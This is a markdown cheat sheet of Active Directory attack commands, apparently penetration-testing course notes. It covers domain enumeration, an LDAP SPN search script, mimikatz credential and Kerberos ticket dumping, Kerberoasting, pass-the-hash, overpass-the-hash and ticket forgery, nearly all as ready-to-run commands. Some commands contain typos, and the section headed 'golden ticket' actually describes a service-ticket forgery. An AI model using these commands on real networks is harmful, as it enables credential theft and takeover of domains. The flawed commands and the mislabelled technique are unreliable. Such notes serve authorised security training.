## Active Directory

* Enumerate users and groups

```
net user /domain
net user jeff_admin /domain
net group /domain
net accounts		# domain's account policy
```

* Domain controller information

```
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
```

* Enumerate Logged on Users

```
Import-Module .\PowerView.ps1

// logged in users on local desktop
Get-NetLoggedon -ComputerName client251

// active sessions on DC
Get-NetSession -ComputerName dc01
```

* Enumerate SPNs to find registered services ip and port

Change `Searcher.filter` accordingly

```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain] ::GetCurrentDomain()

$PDC = ($domainObj.PdcRoleOwner).Name

$SearchString = "LDAP://"
$SearchString += $PDC + "/"

$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

$SearchString += $DistinguishedName

$Searcher= New-Object System.OirectoryServices.DirectorySearcher([ADSI]$SearchString)

$objDomain = New-Object System.DirectoryServices.DirectoryEntry

$Searcher.SearchRoot = $objDomain

$Searcher.filter= "serviceprincipalname=*http*"

$Result= $Searcher.FindAll()

Foreach($obj in $Result)
{
Foreach($prop in $obj.Properties)
{
$prop
}
}
```

* Dump password hashes and tickets stored on local machine

```
mimikatz.exe
mimikatz# privilege::debug

// dump the credentials of all logged-on users
mimikatz# sekurlsa::logonpasswords

// dump TGT and TGS tickets of all logged on users
sekurtsa::tickets

// list all cached tickets 
PS C:\Users\offsec.CORP> klist
mimikatz# kerberos::list /export
```

* Recovering SPN password from TGS ticket

```
sudo apt update && sudo apt install kerberoast
python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt tickets-list.kirbi

// tickets-list.kirbi can be obtained from mimikatz
mimikatz# kerberos::list /export
```

* Pass-The-Hash attacks( requires NTLM auth)

Authenticate to a remote system or service using a user's NTLM hash provided the service uses NTLM authentication.

Existing tools - PsExec from Metasploit, Passing-the-hash toolkit, and Impacket

```
// https://github.com/byt3bl33d3r/pth-toolkit
kali@kali:~$ pth-winexe -U offsec%aad3b435b51484eeaad3b435b51484ee:2892d26cdf84d7a78e2eb3b9f05c425e //10.11.0.22 cmd
```

* Overpass the hash (converting NTLM hash into a Kerberos ticket)

PtH techniques can be used to authenticate to only NTLM supported services. Thus, upgrading NTLM hash to TGT may be quite helpful. The captured TGT may be used by tools like PsExec.exe(supports tickets auth only) to get code execution on domain controller.

```
// spawns powershell as jeff_admin
mimikatz # sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475cllda2a8748298d87aa966c327 /run:PowerShell.exe

// perform action requiring authentication to DC
net use \\dc01

// TGT must be generated now
klist
```

* Generating golden ticket

TGS ticket with known SPN password hash can be forged to access resource as any user.


username (/user), domain name (/domain), the domain user SID(/sid),host name of the service (/target), the service type (/service: HTTP), and the password hash of the service account (/rc4).

```
mimikatz # kerberos::purge

mimikatz # kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1682875587-2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A8748298D87AA966C327 /ptt
```